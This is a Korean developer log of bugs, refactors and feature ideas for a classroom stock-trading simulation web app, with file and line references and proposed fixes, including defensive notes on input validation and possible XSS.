- **`RoomMember.cash` · `Deposit.amount` · `RoomTransaction.amount` `Float` 타입 부동소수점 오차 누적** (`models.py:49`, `models.py:84`, `models.py:74`): 원화 정수값을 IEEE 754 `float`에 저장하면 수십·수백 회 거래 후 `10000000.000000002` 같은 미세 오차가 쌓임. `m.cash -= amount`(매수) → `m.cash += amount`(매도) 반복 시 오차가 누적되어 동일 금액을 입출금해도 원점으로 돌아오지 않음. `db.Column(db.Numeric(precision=18, scale=0))`으로 교체하거나, 단기적으로 거래·정산 시 `m.cash = round(m.cash, 0)` 을 일관되게 적용하면 표시 오류 방지. `amount = price * shares` 계산도 `round(price * shares, 0)` 처리 권장 (`app.py:715` 등).

- **`host_adjust()` `target = db.session.get(User, target_uid)` None 체크 없음 → AttributeError 크래시 위험** (`app.py:571-572`): `m = RoomMember.query.filter_by(room_id=rid, user_id=target_uid).first()` 성공 후 `target = db.session.get(User, target_uid)`를 호출하지만, User 레코드가 DB에서 직접 삭제되거나 데이터 불일치가 있을 경우 `target = None` → `target.username` 접근 시 `AttributeError` → 500 반환. `if not target: return jsonify({'message': f'uid {target_uid} 자산 {delta:+,.0f}원 조정', 'new_cash': m.cash})` 폴백 한 줄로 크래시 방지 가능 (`app.py:572`). 동일 패턴이 `get_rankings()` (`app.py:785`)에도 존재해 `u.username` 접근 전 None 체크 추가 권장.

---

## 2026-06-21

### 추가하면 좋을 기능

- **`enter()` username 길이 검증과 UI maxlength 불일치 → 유효 입력 거부 버그** (`app.py:304`, `index.html:53,59`): `host-student-id` maxlength=15, `host-name` maxlength=20으로 UI상 최대 합산 36자(15+공백+20)가 가능하지만, 서버는 `len(u) > 30` 조건으로 거부하며 오류 메시지는 "닉네임은 2~20자 사이여야 합니다"로 혼란 유발. 학번 14자+이름 17자인 학생은 입력 가능 범위 내에서 값을 입력해도 서버에서 거부됨. 수정: `app.py:305`의 상한을 `len(u) > 50`으로 완화하거나, 오류 메시지를 "학번+이름 합산 30자 이하" 등 정확한 문구로 교체; 근본 해결은 `index.html`의 두 maxlength를 합산 ≤ 29가 되도록 조정(예: 학번 10, 이름 18).

- **`_results_published` 인메모리 → Render 재시작 시 결과 발표 상태 소실** (`app.py:79`, `app.py:1341-1349`): `_results_published: dict = {}` 전역 변수가 메모리에만 존재. 진행자가 "결과 발표하기"를 클릭한 후 서버가 Render 15분 비활성 재시작으로 내려가면 `_results_published[rid]`가 초기화되어 `screen-waiting-results`에서 대기 중인 학생들이 결과 화면을 영원히 볼 수 없음. 수정: `models.py:Room`에 `results_published = db.Column(db.Boolean, default=False)` 컬럼 추가, `host_publish_results()`에서 `room.results_published = True; db.session.commit()`, `room_dict()` 응답에서 `_results_published.get(rid, room.results_published)`로 DB 값을 폴백으로 사용.

- **`_rlt_triggered`/`_rlt_active` 인메모리 → 재시작 시 게임 영구 일시정지** (`app.py:81,223`, `app.py:417-437`): 게임 종료 5초 전 룰렛 자동 트리거 시 `_rlt_triggered.add(rid)`, `room.status='paused'`가 DB에 저장됨. 서버 재시작 시 `_rlt_triggered = set()`, `_rlt_active = {}` 초기화 → 폴링 재개 후 `rid not in _rlt_triggered` 조건 미충족으로 `minigame_available: False` 반환. 학생에게 룰렛이 뜨지 않아 게임이 영구 일시정지 상태로 잠김. `get_room()` 응답 생성 시 `room.status == 'paused' and room.paused_at and rid not in _rlt_triggered`를 감지해 `_rlt_triggered.add(rid)` 자동 복구하거나, 진행자 대시보드에 "룰렛 강제 종료" 버튼 추가 권장.

- **진행자 전체 학생 공지 기능 없음** (`app.py:599-615`, `index.html:185-190`): 교사가 "지금부터 반도체 섹터에 집중하세요"와 같은 자유 형식 텍스트를 전체 학생에게 즉시 전달할 방법이 없음. 뉴스 시스템은 종목 편향에 연동되어 있어 단순 공지로 쓰기엔 부적절. `POST /api/rooms/<rid>/host/announce` 엔드포인트 + `Room`에 `announcement = db.Column(db.Text, nullable=True)` 컬럼 추가, `room_dict()` 응답에 포함, 프론트 폴링에서 새 공지 감지 시 `toast()` 3초 팝업 표시하면 50줄 이내 구현 가능.

- **방별 활성 종목(섹터) 선택 기능 없음** (`stock_service.py:36-99`, `app.py:334-344`): 47개 종목 전체가 항상 표시됨. 반도체 집중 수업에는 해당 섹터만, 입문 수업에는 10개 이하만 허용하는 설정 불가. `Room` 모델에 `allowed_sectors = db.Column(db.Text, nullable=True)` (JSON 배열 문자열) 추가, `get_stocks()` (`app.py:620-640`)에서 `json.loads(room.allowed_sectors)` 파싱 후 해당 섹터만 필터링, 방 생성 화면(`index.html:42-76`)에 섹터 체크박스 UI 추가. 전체 종목 노출로 인한 학생 혼란 방지에 효과적.

- **예금 최소 금액·최대 건수 제한 없음** (`app.py:847-871`): `create_deposit()` 검증이 `0 < amount`뿐이라 0.01원 예금 생성 가능. 건수 제한도 없어 1원 예금 수백 건 생성 시 `_end_room()` 정산 루프가 비례해 증가. `if amount < 10_000: return jsonify({'error': '최소 예금 금액은 1만원입니다.'}), 400`와 `if Deposit.query.filter_by(room_id=rid, user_id=uid, status='active').count() >= 5: return jsonify({'error': '예금은 최대 5건까지 가능합니다.'}), 400` 두 줄 추가로 방어 가능.

### 제거/단순화할 것들

- **`lottery-notify-bar` 인라인 스타일 `display:none` 이중 선언** (`index.html:136`): `style="display:none;background:var(--warn);...;display:none;align-items:center;..."` — 같은 `style` 속성 내에 `display:none`이 두 번 등장하고 `display:flex`는 선언되지 않음. JS가 런타임에 `bar.style.display = 'flex'`로 교체하므로 동작 오류는 없지만 코드가 혼란스러움. `style="display:none"` 단 한 번으로 정리하고 레이아웃 속성(`align-items`, `justify-content`, `gap`)은 CSS 클래스로 분리 권장.

- **`closeLotteryOverlay()`에서 `paused-banner` 무조건 제거** (`app.js:2233-2237`): 복권 오버레이 닫기 시 `document.getElementById('paused-banner')?.remove()`를 항상 실행. 진행자가 수동으로 게임을 일시정지한 상태에서 복권이 진행된 경우, 복권 종료 후에도 일시정지 배너가 유지되어야 하지만 무조건 제거됨. 수정: `_stopLotPolling()` 이후 `refreshRoomStatus()`(또는 단순 `fetch`)로 서버 상태를 재조회해 `S.room.status === 'paused'`이면 배너를 유지하는 조건 추가.

- **`openStockModal()` 매 호출마다 portfolio API 재호출** (`app.js:1308-1315`): 학생이 종목 카드를 탭할 때마다 `GET /api/rooms/${S.room.id}/portfolio`를 호출해 현금·보유 수량을 새로 가져옴. `loadPortfolio()`나 `execTrade()` 성공 직후 이미 `S.tradeCash`·보유 수량이 갱신되어 있으므로, 캐시된 값을 즉시 표시하고 백그라운드에서 검증용 재조회를 수행하면 탭 반응 속도 향상. 동일 종목을 연속 탭하는 흔한 시나리오에서 불필요한 왕복 제거 가능.

- **`minigame_spin()` 청산 후 현금 음수 가능성** (`app.py:993-1032`): `shares_to_sell = max(1, int(shortfall / price))` 정수 내림으로 루프 종료 후 shortfall이 소량 남을 수 있음. 이후 `m.cash = m.cash - bet + winnings`에서 winnings=0(꽝)이면 `m.cash < 0`이 될 수 있음. `bet > total_assets` 사전 체크가 있으나 정수 내림 오차 누적 시 예외 케이스 발생. 청산 루프 종료 직후 `m.cash = max(0.0, m.cash - bet + winnings)` 하한선 보장 한 줄로 방어 (`app.py:1032` 인근).

- **`_set_sqlite_pragmas()` 이벤트 리스너가 `db.create_all()` 이후 등록** (`app.py:26-29`): `with app.app_context(): db.create_all()` 실행 시 DB 연결이 생성되지만 pragma 이벤트 리스너(`_sa_event.listen(db.engine, "connect", _set_sqlite_pragmas)`)는 그 이후에 등록됨. 스키마 생성 연결은 WAL 모드·busy_timeout 없이 동작. pragma 리스너 등록을 `db.create_all()` 호출 이전으로 이동하거나, 스키마 생성 후 `with db.engine.connect() as conn: conn.execute(text("PRAGMA journal_mode=WAL"))` 명시적 초기화 추가 권장.

---

## 2026-06-21 (2차)

### 추가하면 좋을 기능

- **URL `?code=` 파라미터 미활용으로 QR 스캔 후에도 코드 수동 입력 필요** (`app.js:197-201`, `index.html:참여 폼`): `_makeQR()`이 `${location.origin}${location.pathname}?code=${S.room.code}` URL을 생성하지만 입장 화면 초기화 시 이 파라미터를 읽어 `join-code` 필드에 자동 채우는 코드가 없음. 학생이 QR을 스캔해 들어와도 6자리 코드를 손으로 다시 입력해야 함. `window.addEventListener('DOMContentLoaded', () => { const c = new URLSearchParams(location.search).get('code'); if (c) { document.getElementById('join-code').value = c; document.getElementById('join-tab-btn')?.click(); } })` 10줄로 해결 가능하며 모바일 수업 시 입장 시간을 크게 단축할 수 있음.

- **복권 picking 단계에서 진행자가 참여 현황을 볼 수 없음** (`app.py:1131-1147`): `get_lottery()`가 진행자에게 `revealed` 단계의 `all_results`는 반환하지만 `picking` 단계에서 몇 명이 이미 번호를 선택했는지 (`len(cur['picks'])`)를 반환하지 않음. 진행자가 "23명 중 몇 명이 선택했나요?" 상황에서 추첨 타이밍을 잡기 어려움. `app.py:1139` `result` 딕셔너리에 `'picking_count': len(cur.get('picks', {}))` 필드를 추가하고 진행자 복권 모달에 "선택 완료: N명" 텍스트를 표시하면 수업 흐름 개선.

- **결과 화면에 클래스 전체 평균 수익률 없음** (`app.js:1702-1720`): `loadResults()`는 개인별 순위를 렌더링하지만 클래스 평균 수익률이나 평균 최종 자산을 별도로 표시하지 않음. `const avgGain = data.reduce((s,e) => s + e.gain_pct, 0) / data.length`로 한 줄 계산 가능하며, 결과 화면 1등 카드 위에 `<div class="summary-card">클래스 평균 수익률: ${pct(avgGain)}</div>`를 추가하면 수업 마무리 토론에서 교사가 즉각 활용 가능. 수업 후 "우리 반 평균은 +3.2%였는데 코스피는 -0.5%였습니다" 같은 맥락 제공 가능.

- **시장 탭 종목 카드에 보유 수량 뱃지 없음** (`app.js:1287-1311`, `app.js:1445-1453`): 학생이 시장 탭을 보면서 이미 보유한 종목인지 파악하려면 모달을 열거나 포트폴리오 탭을 확인해야 함. `execTrade()` 성공 후 `S.tradeHolding`이 갱신되므로 (`app.js:1447-1450`), `S.holdingMap = {}` 상태를 추가해 `openStockModal()` 응답 및 거래 성공 시 갱신, `renderGrid()` 내 `S.holdingMap[st.symbol] > 0`이면 카드 우하단에 `<span class="chip chip-blue">${n}주</span>` 뱃지를 표시하면 서버 추가 요청 없이 구현 가능. 종목이 47개나 되어 보유 여부를 한눈에 파악하기 어려운 학생에게 큰 도움.

- **`loadGuides()`·`loadTips()` 탭 전환 시마다 무조건 재요청** (`app.js:1933, 1956`): `loadGlossary()`는 `if (!S.glossaryData.length)` 가드로 캐시를 활용하지만 (`app.js:1899`), `loadGuides()`와 `loadTips()`는 탭을 전환할 때마다 `/api/education/guides`와 `/api/education/tips`를 재호출함. 교육 콘텐츠는 게임 내내 변하지 않으므로 `S.guidesData`, `S.tipsData` 배열을 State(`app.js:1-24`)에 추가하고 비어 있을 때만 API를 호출하면 학생 30명 × 탭 전환 횟수만큼의 불필요한 요청을 제거할 수 있음.

- **퀴즈 시간 초과 시 패널티 금액을 화면에 표시하지 않음** (`app.js:875-879`, `app.py:1298`): 시간 초과 시 `submitQuiz(null)`가 호출되어 서버에서 `td.penalty`(오답 패널티 금액)를 수신하지만 (`app.py:1298`에서 `penalty`를 반환), 화면에는 "⏰ 시간 초과!" 이모지와 토스트 메시지만 표시하고 결과 카드에 패널티 금액이 표시되지 않음 (`app.js:876-879`). 정답/오답 케이스처럼 `result.innerHTML`에 `<div style="color:var(--down)">-${td.penalty.toLocaleString()}원 차감</div>`를 추가하면 학생이 결과를 명확히 인지 가능.

---

### 제거/단순화할 것들

- **`stopPolling()`에서 복권 폴링 미정리** (`app.js:779-783`): `stopPolling()`은 `clearInterval(S.pollInterval)`, `clearInterval(S._waitingPoll)`, `stopNewsPolling()`을 호출하지만 `_stopLotPolling()`을 호출하지 않음. 결과 화면으로 전환하거나 홈으로 이동해도 `_lotPollInterval`이 살아 남아 5초마다 `/api/rooms/<rid>/lottery` 요청이 계속 발생. `stopPolling()` 함수 본문 마지막에 `_stopLotPolling()` 한 줄을 추가하면 (`app.js:782` 직후) 해결되며, 종료된 방에 대한 불필요한 폴링과 콘솔 에러가 사라짐.

- **`models.py` `datetime.utcnow` Python 3.12 Deprecation** (`models.py:20, 38, 53, 79, 92`): `default=datetime.utcnow`는 Python 3.12에서 `DeprecationWarning: datetime.utcnow() is deprecated and scheduled for removal`를 발생시킴. `default=lambda: datetime.now(timezone.utc)` 패턴으로 일괄 교체 필요. `app.py` 전체에도 `datetime.utcnow()` 직접 호출이 약 15곳 존재 (`app.py:125, 279, 413, 421, 437, 483, 498, 511, 528...`). `from datetime import datetime, timedelta, timezone`은 이미 임포트되어 있으므로 `utcnow()` → `now(timezone.utc)`로 에디터 일괄 치환 가능.

- **`minigame_close()` 내 `Room.query.get(rid)` 폐기 패턴** (`app.py:977`): 이 함수만 `Room.query.get(rid)` (SQLAlchemy Legacy 패턴)을 사용 중이며 나머지 모든 라우트는 `Room.query.get_or_404(rid)`를 씀. SQLAlchemy 2.0으로 마이그레이션 시 해당 행에서만 오류 발생. `db.session.get(Room, rid)`로 교체하면 통일성 확보 및 Legacy API 의존 제거. 이 함수는 Lock 내부에서 호출되므로 세션 상태 주의가 필요하지만 교체 자체는 단순.

- **`_do_reveal()` 내 Room 이중 조회** (`app.py:226, 233`): `_room_lot = db.session.get(Room, rid)` (`app.py:226`)로 조회한 후 `db.session.commit()`, 이후 `room = db.session.get(Room, rid) if _room_lot is None else _room_lot` (`app.py:233`) 로직이 혼란스러움. 226에서 이미 `_room_lot`을 가져왔으므로 `None`이 될 경우는 방이 삭제된 예외 케이스뿐. 226의 조회 결과를 `room`에 직접 할당하고 `if room:` 가드를 쓰면 코드가 명확해지고 DB 왕복 1회 제거 가능.

- **`renderGrid()` 내 인라인 `onclick` 주입 패턴** (`app.js:1293-1310`): `onclick="openStockModal('${st.symbol}')"` 및 `onclick="toggleWatchlist('${st.symbol}',event)"` 형태로 심볼을 HTML 문자열에 직접 삽입. 현재 심볼은 서버에서 정의된 ASCII 문자열이라 안전하지만, 이벤트 핸들러가 카드 수(47개) × 렌더링 횟수만큼 매번 생성됨. `data-symbol` 속성으로 심볼을 저장하고 `stock-grid`에 이벤트 위임 리스너 1개를 등록하면 이벤트 핸들러 생성 오버헤드를 없애고 미래 확장 시 XSS 위험도 차단 가능.

- **`export_rankings()` N+1 쿼리 패턴** (`app.py:1431-1440`): `export_rankings()`도 `member_total_value(rid, m.user_id)` 루프 패턴 (`app.py:1433`)을 그대로 사용해 참여자 수만큼 RoomHolding·Deposit 쿼리를 반복 실행. `host_members()` (`app.py:554`)·`get_rankings()` (`app.py:817`)과 동일한 N+1 문제. 2026-06-11에 `get_rankings()`의 배치 조회 방식을 권고했으나 엑셀 내보내기에는 적용되지 않음. 세 함수에 공통 `batch_total_values(rid)` 헬퍼(단일 쿼리로 전체 보유·예금 합산)를 추출하면 세 곳 동시 해결 가능.

---

## 2026-06-22

### 추가하면 좋을 기능

- **룰렛 전액 베팅 확인 단계 없음** (`app.js:1032`, `doRouletteSpin()`): 슬라이더를 100%로 설정한 후 "룰렛 돌리기" 버튼을 누르면 즉시 전 재산을 베팅한 채 스핀이 실행됨. `setRltPct(100)` 클릭 시 버튼 텍스트를 "⚠️ 전액 베팅 확인" 등으로 바꾸거나, `doRouletteSpin()` 내에서 `rltPct >= 80` 조건이면 `confirm()` 다이얼로그를 띄우는 한 줄 가드(`if (!confirm('전체 자산의 ${rltPct}%를 베팅합니다. 계속하시겠습니까?')) return;`)를 추가하면 학생의 실수 클릭 방지. 특히 모바일에서 슬라이더 오조작이 잦음.

- **진행자가 종료 직전 룰렛 완료 현황 확인 불가** (`app.py:920-936`): 게임이 자동 종료 직전 룰렛 미니게임이 열리는데, 진행자 화면에는 몇 명이 룰렛을 완료했는지 표시되지 않음. `_lots` 딕셔너리와 유사하게 `_rlt_done: dict[int, set] = {}` 를 `app.py:90` 근처에 두고, 참가자가 `/api/rooms/<rid>/minigame/spin` 성공 시 `_rlt_done[rid].add(uid)`로 기록, 진행자용 `/api/rooms/<rid>/status` 또는 `room_dict()` 응답에 `"rlt_done_count"` 필드를 추가하면 "룰렛 완료: 18/24명" 형태로 진행자가 모니터링 가능.

- **상·하한가 종목 시각 표시 없음** (`stock_service.py:139`, `app.js:1287-1311`): `StockService._next_price()`는 `base_price * 0.6` ~ `base_price * 1.4` 범위로 가격을 clamp하므로 상한가·하한가 상태가 실제로 존재함. 그러나 시장 그리드 카드(`renderGrid()`, `app.js:1293`)에는 이를 알리는 표시가 없어 학생이 "왜 더 오르지 않지?"를 이해하기 어려움. `/api/rooms/<rid>/stocks` 응답에 `"at_upper": price >= base*1.39, "at_lower": price <= base*0.61` 플래그를 추가하고 카드에 `<span class="chip chip-red">상한가</span>` / `<span class="chip chip-blue">하한가</span>` 뱃지를 붙이면 교육적 효과가 높아짐.

- **엑셀 내보내기 시 종료 후 재생성된 StockService의 랜덤 가격 반영** (`app.py:1432-1433`, `stock_service.py:317-322`): `_end_room()` (`app.py:120`)은 `cleanup_room_service(rid)`를 호출해 인메모리 StockService를 삭제함. 이후 진행자가 `/api/rooms/<rid>/export`를 호출하면 `member_total_value()` → `get_room_service(rid)` 경로에서 새 StockService가 랜덤 초기 가격으로 생성되어, 실제 종료 시점 가격이 아닌 임의의 가격으로 주식 자산을 계산함. 종료 시점에 심볼별 최종 가격을 `Room` 테이블의 JSON 컬럼(또는 별도 `RoomFinalPrice` 테이블)에 스냅숏으로 저장하고 `export_rankings()`와 `_end_room()` 정산 모두 이 값을 참조하면 정확한 결과 보장.

- **결과 화면에 클래스 전체 활동 통계 없음** (`app.py:1419-1488`): 현재 엑셀 내보내기는 순위·보유 현황만 담음. 학생별 총 거래 횟수, 가장 많이 거래된 종목 Top5, 최대 수익률 종목 등 수업 복기에 유용한 통계가 없음. `RoomTransaction` 테이블 집계(`GROUP BY symbol`, `COUNT(*)`)로 별도 시트를 추가하면 추가 API 없이 엑셀 파일 내에서 수업 마무리 토론 자료가 됨 (`app.py:1460` 이후 `ws2 = wb.add_worksheet(...)` 추가 방식).

- **퀴즈 일시정지 중 접근 가능** (`app.py:1248`, `app.js:832`): 진행자가 게임을 일시정지(`room.status == 'paused'`)해도 퀴즈 FAB 버튼(`index.html:470`)은 계속 보이며 클릭하면 `openQuiz()`가 서버에 `GET /api/rooms/<rid>/quiz`를 요청함. 서버 측 `get_quiz()` (`app.py:1248`)에는 `room.status != 'active'` 가드가 없어 일시정지 중에도 퀴즈가 열림. 서버에서 `if room.status != 'active': return jsonify({'error': 'room not active'}), 400` 한 줄 추가 + 클라이언트에서 FAB를 `room.status === 'active'` 일 때만 표시하면 해결.

### 제거/단순화할 것들

- **`_ending_soon` 인메모리 set → 계산식으로 교체 가능** (`app.py:90`, `app.py:304`): `_ending_soon: set = set()`는 룰렛을 한 번만 트리거하기 위한 플래그인데, Render 재시작 시 초기화되어 재시작 직후 종료 시각이 1분 미만인 방에서 룰렛이 재트리거되는 버그가 있음. `room.rlt_triggered` DB 컬럼이 이미 존재하므로(`models.py:39`) 이 컬럼만으로 중복 방지가 가능. `_ending_soon` set는 제거하고 `room_dict()` (`app.py:304`)의 `ending_soon` 계산식을 `not room.rlt_triggered and room.end_time and (room.end_time - now).total_seconds() <= 60`으로 단순화하면 인메모리 상태 하나 제거.

- **`RoomHolding` 0주 레코드 누적** (`app.py:1037-1040`, `app.py:1318`, `app.py:760`): 룰렛 스핀(`app.py:1037-1040`)과 퀴즈 오답 패널티(`app.py:1304-1326`)에서 보유 주식 강제 처분 시 `h.shares = 0; h.avg_price = 0` 후 `db.session.commit()`만 하고 레코드를 삭제하지 않음. 반면 일반 매도(`app.py:760`)는 `db.session.delete(h)` 후 커밋함. 누적된 0주 레코드는 포트폴리오 조회·랭킹 집계 시 필터링되지 않으면 오답 패널티 이후 종목이 0주로 계속 표시됨. 두 코드 블록 모두 `db.session.delete(h)` 방식으로 통일 필요.

- **`get_room()` 라우트 내 6가지 사이드이펙트 혼재** (`app.py:432-473`): 단일 GET 라우트가 ① 자동 종료 처리, ② 룰렛 트리거, ③ Render 재시작 후 복구, ④ 복권 자동 시작, ⑤ 캐시 무효화, ⑥ 응답 직렬화를 모두 담당. GET 요청에 이런 부작용이 집중되면 폴링 10초마다 의도치 않은 상태 변이가 발생할 수 있음. `_check_and_advance_room(rid)` 헬퍼를 추출해 사이드이펙트를 명시적으로 분리하고, 각 동작에 `if`-early-return 패턴을 적용하면 가독성·테스트 용이성이 높아짐.

- **뉴스 폴링 클라이언트 8초 고정 vs 서버 TTL 불일치** (`app.js:810`, `stock_service.py:167-175`): `startNewsPolling()`은 `setInterval(..., 8000)` 하드코딩, 서버 뉴스 TTL은 `5~300초` 범위에서 종목별로 다름. 서버 응답에 `"next_refresh_in": seconds` 필드를 포함하고 클라이언트가 해당 값을 사용해 다음 폴링 타이머를 설정하면 불필요한 요청을 줄이고 TTL 설정과 실제 동작이 동기화됨. 이는 기존 제안(`2026-06-21(2차)`)의 뉴스 지연 언급보다 구체적인 서버-클라이언트 TTL 동기화 해법.

- **RLT/LOTTO 미니게임 결과가 거래내역에 '조정(ADJ)'으로 표시** (`app.py:839-847`, `app.py:1064-1072`): 룰렛·복권 결과로 현금이 증감할 때 `RoomTransaction` 레코드에 `action='ADJ'`가 기록됨. 이는 진행자 조정(`app.py:839`)과 동일한 액션 타입이어서, 엑셀 내보내기나 거래내역 조회 시 진행자가 직접 조정한 것인지 미니게임 결과인지 구분 불가. `action` 컬럼을 `'RLT'`(룰렛), `'LOT'`(복권)으로 분리하거나 `note` 필드에 출처를 명시하면 감사 추적성 확보. `models.py:74`의 `'BUY / SELL / ADJ'` 주석도 함께 갱신 필요.

---

## 2026-06-22 (2차)

### 추가하면 좋을 기능

- **`StockService._prev` 주기적 갱신으로 뉴스 사이클별 변동률 표시** (`stock_service.py:127`, `stock_service.py:160-164`, `app.py:661`): `_prev` 딕셔너리는 `_init_prices()` 에서 딱 1회만 설정되고 이후 전혀 갱신되지 않음. 60분 게임에서 가격이 +50% 상승한 상태에서 `-5%` 하락해도 학생 화면의 `change_pct`는 시작가 대비 `+42.5%`로 표시되어 "오늘의 변동률" 개념과 완전히 다름. `_maybe_generate_news()` 내 `self._current_biases = self._next_biases.copy()` 직전에 `for sym, (ts, price) in self._prices.items(): self._prev[sym] = price`를 추가하면 뉴스 주기마다 `_prev`가 갱신되어 직전 뉴스 사이클 종가 대비 등락률을 표시하는 의미 있는 변동률 제공 가능.

- **학생용 개인 거래내역 CSV 내보내기** (`app.py:829-847`, `models.py:68-79`): 현재 엑셀 내보내기(`GET /api/rooms/<rid>/export`)는 진행자 전용. 학생이 자신의 거래 내역을 다운로드해 스프레드시트에서 분석하는 교육 활동 불가능. `GET /api/rooms/<rid>/transactions/export` 엔드포인트를 추가해 `RoomTransaction.query.filter_by(room_id=rid, user_id=user.id)`를 Python 내장 `csv` 모듈로 직렬화해 반환하면 openpyxl 없이 20줄로 구현 가능. 게임 후 교사의 "자신의 거래를 정리해 발표해봅시다" 과제와 즉시 연계됨.

- **진행자 화면에 방 내 인기 종목 실시간 순위 패널** (`app.py:540-562`, `index.html:진행자탭`): 진행자가 어떤 종목에 거래가 집중되는지 볼 방법이 없음. `GET /api/rooms/<rid>/host/hot-stocks` 엔드포인트를 추가해 `db.session.query(RoomTransaction.symbol, db.func.count().label('cnt')).filter_by(room_id=rid).group_by(RoomTransaction.symbol).order_by(db.desc('cnt')).limit(5).all()`로 집계 후 반환. 진행자 탭 순위 패널 하단에 "🔥 인기 종목 Top5" 카드로 표시하면 교사가 "지금 여러분 삼성전자에 집중되어 있네요, 이유가 뭘까요?" 형태의 실시간 수업 개입 포인트 확보.

- **퀴즈 답변 전 보상/패널티 금액 사전 표시** (`app.py:1248-1268`, `app.js:849-870`): 현재 퀴즈 오버레이는 질문만 표시하고 맞히면 얼마, 틀리면 얼마인지 보여주지 않음. `GET /api/rooms/<rid>/quiz` 응답에 `reward_amount: max(10000, int(room.starting_cash * reward_pct / 100))`와 `penalty_amount` 필드를 추가하고, 퀴즈 오버레이 하단에 `💰 정답 +XX만원 / ❌ 오답 -XX만원` 한 줄을 표시하면 학생이 리스크 대비 기대값을 계산하며 전략적으로 답변하는 금융 교육 효과 극대화. 서버 3줄, 클라이언트 2줄 추가로 구현 완료.

- **복권 진행자 수동 시작 시 기본 상금 설정 저장** (`app.py:1078-1112`, `index.html:복권모달`): `lottery_start()` 호출마다 진행자가 상금을 매번 직접 입력해야 함. `_quiz_settings[rid]` 패턴을 차용해 `_lottery_default_prize[rid]` 인메모리 딕셔너리를 추가하고, 진행자 설정 탭에 "기본 복권 상금" 입력란 제공. 복권 모달 열 때 `_lottery_default_prize.get(rid, member_count * 30_000_000)` 으로 초기값을 채우면 반복 수업에서 매번 입력하는 번거로움 제거.

- **룰렛 스핀 결과 로컬 히스토리 표시** (`app.js:doRouletteSpin()`, `app.js:1100-1130`): 학생이 룰렛 오버레이에서 다시 spin을 클릭하면 이전 결과가 사라져 "아까 내가 뭘 받았지?" 확인 불가. `S.rltHistory = []` 배열을 `doRouletteSpin()` 성공 시 `S.rltHistory.push({outcome: data.outcome, net: data.net, bet: data.bet})`로 누적하고, 룰렛 오버레이 최하단에 "내 스핀 기록" 섹션으로 최대 3건 표시. 거래내역(`RLT` 액션)과 연결해 복습 가능. 서버 변경 없이 5줄로 구현.

---

### 제거/단순화할 것들

- **`get_quiz()` 룸 멤버십 검증 누락 → 비참여자 퀴즈 상태 소비 가능** (`app.py:1250-1268`): `get_quiz()`는 `@login_required` + `room.status == 'active'` 만 확인하고 `RoomMember.query.filter_by(room_id=rid, user_id=user.id).first()` 체크가 없음. 방에 가입하지 않은 사용자(또는 강퇴된 학생)가 GET으로 퀴즈를 요청하면 `_quiz_state[(rid, uid)]`가 갱신되어 `seen` 집합과 쿨다운이 설정됨. 이후 `submit_quiz()` POST는 `member`가 없으면 현금 변동 없이 응답하지만 서버 상태를 소비. `get_quiz()` 진입부에 `if not RoomMember.query.filter_by(room_id=rid, user_id=user.id).first(): return jsonify({'error': '참여자가 아닙니다.'}), 403` 한 줄 추가로 방어.

- **`create_room()` 숫자 파싱 예외 미처리 → 500 반환** (`app.py:384-386`): `int(d.get('duration_minutes', 30))`, `float(d.get('starting_cash', ...))`, `float(d.get('deposit_rate', ...))` 세 파싱 모두 try/except 없이 사용. 악의적 클라이언트가 `{"duration_minutes": "삼십분"}` 같은 값을 전송하면 `ValueError: invalid literal` → 500 Internal Server Error 반환. 각 필드를 `try/except (TypeError, ValueError): return jsonify({'error': '잘못된 숫자 입력'}), 400` 으로 감싸거나, `d.get('duration_minutes', 30)` 이후 `isinstance` 타입 체크를 선행하면 방어 가능. 같은 패턴이 `host_adjust()` (`app.py:595`), `lottery_start()` (`app.py:1086`), `lottery_skip()` (`app.py:1216`)에도 존재.

- **`lottery_start()` 상금 상한 없음 → 부동소수점 오버플로 위험** (`app.py:1086-1087`): `prize = float(d.get('prize', 0))`에 최대값 검증이 없음. 진행자가 `1e30` 같은 값을 입력하면 당첨 학생의 `m.cash += prize`가 그대로 실행되고 `round(prize / 25)` 등 연산이 부동소수점 `inf`나 비정상 값을 반환할 수 있음. `member_count = RoomMember.query.filter_by(room_id=rid).count()` 이후 `if prize > room.starting_cash * max(member_count, 1) * 100: return jsonify({'error': '상금이 너무 큽니다.'}), 400` 한 줄 추가. 같은 맥락에서 `prize <= 0` 체크(`app.py:1087`) 외에 `math.isfinite(prize)` 가드도 병행 권장.

- **`showBombNews()` `item.headline` HTML 미이스케이프 → 잠재적 XSS** (`app.js:showBombNews()`, `stock_service.py:152, 235, 266`): `content.innerHTML = items.map(item => \`... ${item.headline} ...\`).join('')` 형태로 headline을 직접 삽입. 현재 headline은 `NEWS_TEMPLATES_*` 서버 측 상수에서만 생성되므로 즉각 위험은 없지만, `force_price()` (`stock_service.py:234-235`)와 `force_sector_event()` (`stock_service.py:263-269`)에서 `STOCKS[sym]['name']`·`STOCKS[sym]['sector']` 를 그대로 headline에 삽입하며 이 값들이 미래에 외부 DB 연동 등으로 변경 가능성이 있는 경우 XSS 경로가 열림. 현재 구현 내 `escHtml()` 유틸(`app.js:899`)로 `escHtml(item.headline)` 교체 및 `<br>` 등 허용 태그만 화이트리스트 처리 권장.

- **`openRouletteModal()` minigame/open API 실패 시 게임 영구 일시정지 위험** (`app.js:1142-1150`): `const pr = await api.post(\`/api/rooms/${S.room.id}/minigame/open\`, {}).catch(() => null)` — API 호출 실패 시 `pr = null`로 처리하고 룰렛 모달은 열리지만, 서버의 `_rlt_active[rid].count`는 증가하지 않음. 이후 `closeRoulette()` → `minigame/close` POST는 `state.count <= 0`을 감지해 `return {'ok': True}`를 즉시 반환하며 game resume이 일어나지 않음. 즉 서버는 `paused` 상태인데 룰렛 활성 count는 0이어서 자동 resume 조건 미달. `if (!pr || pr.error) { closeRoulette(); toast('룰렛 서버 연결 오류', 'error'); return; }` 로 실패 시 모달 닫기 처리 필요.

- **`_prev_close` 기반 `change` 필드가 세션 시작가 고정으로 UI에서 혼란 유발** (`app.py:661-669`, `stock_service.py:278-279`): `get_stocks()` 응답의 `change`, `change_pct`는 `prev = svc.get_prev_close(sym)` 즉 게임 시작 초기 가격 대비로 계산됨. 게임 30분 경과 후 가격이 +35% 상승해 있는 상태에서 최근 뉴스로 -2% 하락해도 카드에는 `+31.9% ▲`로 표시. 학생이 "지금 떨어지고 있는데 왜 초록색이지?" 혼란 유발. `_maybe_generate_news()` 내에서 `self._prev` 를 현재 가격으로 스냅숏하거나, 적어도 `get_stocks()` 응답에 `change_from` 필드로 기준 시점을 명시하면 오해 방지.

